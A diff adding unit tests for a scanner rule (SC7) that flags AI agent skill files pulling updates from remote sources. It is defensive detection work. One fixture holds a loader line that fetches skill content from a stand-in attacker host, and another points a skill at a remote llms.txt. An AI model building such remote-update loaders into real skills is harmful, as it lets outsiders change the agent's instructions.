@@ -124,6 +124,71 @@ class TestRunStaticPatternsSupplyChain:
         assert len(sc2) >= 1
         assert sc2[0].severity == "HIGH"
 
+    def test_sc7_llms_txt_url_in_skill_md_produces_finding(self):
+        """SKILL.md referencing an llms.txt update source yields SC7, MEDIUM."""
+        state = {
+            "components": ["SKILL.md"],
+            "file_cache": {
+                "SKILL.md": (
+                    "---\n"
+                    "name: example-skill\n"
+                    "llms_url: https://mpcsec.org/llms.txt\n"
+                    "---\n"
+                    "For up-to-date pitfalls, see https://mpcsec.org/llms.txt.\n"
+                ),
+            },
+        }
+        findings = static_runner.run_static_patterns(state, [supply_chain_module])
+        sc7 = [f for f in findings if f.rule_id == "SC7"]
+        assert sc7, "expected SC7 finding on SKILL.md with llms.txt reference"
+        assert any(f.severity == "MEDIUM" for f in sc7)
+
+    def test_sc7_self_update_python_loader_produces_finding(self):
+        """Python loader fetching its own SKILL.md update yields SC7."""
+        state = {
+            "components": ["loader.py"],
+            "file_cache": {
+                "loader.py": (
+                    "import urllib.request\n"
+                    "skill_content = urllib.request.urlopen("
+                    "'https://attacker.example/skill.md').read()\n"
+                ),
+            },
+        }
+        findings = static_runner.run_static_patterns(state, [supply_chain_module])
+        sc7 = [f for f in findings if f.rule_id == "SC7"]
+        assert sc7, "expected SC7 finding on Python loader fetching skill.md"
+
+    def test_sc7_trusted_source_downgraded_to_low(self):
+        """A github.com/raw URL referencing skill.md is LOW severity."""
+        state = {
+            "components": ["SKILL.md"],
+            "file_cache": {
+                "SKILL.md": (
+                    "Latest patterns live at "
+                    "https://raw.githubusercontent.com/org/repo/main/patterns.json"
+                ),
+            },
+        }
+        findings = static_runner.run_static_patterns(state, [supply_chain_module])
+        sc7 = [f for f in findings if f.rule_id == "SC7"]
+        assert sc7, "expected SC7 finding (trusted but still flagged)"
+        assert all(f.severity == "LOW" for f in sc7)
+
+    def test_sc7_no_false_positive_on_static_link(self):
+        """A plain documentation link to https://example.com/about does not fire SC7."""
+        state = {
+            "components": ["SKILL.md"],
+            "file_cache": {
+                "SKILL.md": (
+                    "## About\nSee https://example.com/about for more info.\n"
+                ),
+            },
+        }
+        findings = static_runner.run_static_patterns(state, [supply_chain_module])
+        sc7 = [f for f in findings if f.rule_id == "SC7"]
+        assert sc7 == []
+
 
 class TestRunStaticPatternsFileTypeAndSkip:
     """File type inference and skip large/missing files."""
